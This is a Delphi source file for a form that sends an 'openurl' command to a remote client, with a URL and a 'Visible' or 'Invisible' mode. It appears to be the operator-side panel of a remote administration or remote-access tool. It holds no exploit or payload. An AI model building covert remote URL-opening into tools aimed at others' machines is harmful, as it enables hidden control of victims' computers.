unit UnitOpenURL;

interface

uses
  Winapi.Windows, Winapi.Messages, Winapi.Winsock2,
  System.SysUtils, System.Variants, System.Classes, System.JSON,
  System.Generics.Collections,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,
  ncLines;

type
  TOnSendJSON = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TOnUnregister = procedure(aLine: TncLine) of object;

  TForm8 = class(TForm)
    Edit1: TEdit;
    Button1: TButton;
    ComboBox1: TComboBox;
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    FLine: TncLine;
    FChannelLine: TncLine;
    FClientID: string;
    FOnSendJSON: TOnSendJSON;
    FOnUnregister: TOnUnregister;
    function GetActiveLine: TncLine;
  public
    procedure SetChannelLine(aChanLine: TncLine);
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendJSON: TOnSendJSON; AUnregister: TOnUnregister);
    procedure DetachCallbacks;
    procedure RequestInit;
  end;

var
  Form8: TForm8;

implementation

{$R *.dfm}

function TForm8.GetActiveLine: TncLine;
begin
  if Assigned(FChannelLine) then
    Result := FChannelLine
  else
    Result := FLine;
end;

procedure TForm8.SetChannelLine(aChanLine: TncLine);
begin
  FChannelLine := aChanLine;
end;

procedure TForm8.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendJSON: TOnSendJSON; AUnregister: TOnUnregister);
begin
  FLine := aLine;
  FChannelLine := nil;
  FClientID := ClientID;
  FOnSendJSON := ASendJSON;
  FOnUnregister := AUnregister;
  Caption := 'Open URL - ' + FClientID;

  Button1.OnClick := Button1Click;
  OnClose := FormClose;
end;

procedure TForm8.DetachCallbacks;
begin
  FOnSendJSON := nil;
  FOnUnregister := nil;
  FLine := nil;
end;

procedure TForm8.RequestInit;
var
  JSONObj: TJSONObject;
  TargetLine: TncLine;
begin
  TargetLine := GetActiveLine;
  if not Assigned(FOnSendJSON) or (TargetLine = nil) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'openurl_init');
    FOnSendJSON(TargetLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm8.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  TargetLine: TncLine;
begin
  TargetLine := GetActiveLine;
  if not Assigned(FOnSendJSON) or (TargetLine = nil) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'openurl');
    JSONObj.AddPair('url', Edit1.Text);
    JSONObj.AddPair('mode', ComboBox1.Text); // 'Visible' or 'Invisible'
    FOnSendJSON(TargetLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm8.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FChannelLine) then
  begin
    try
      Winapi.Winsock2.closesocket(FChannelLine.Handle);
    except
    end;
    FChannelLine := nil;
  end;

  if Assigned(FOnUnregister) and (FLine <> nil) then
    FOnUnregister(FLine);
  Action := caFree;
end;

end.

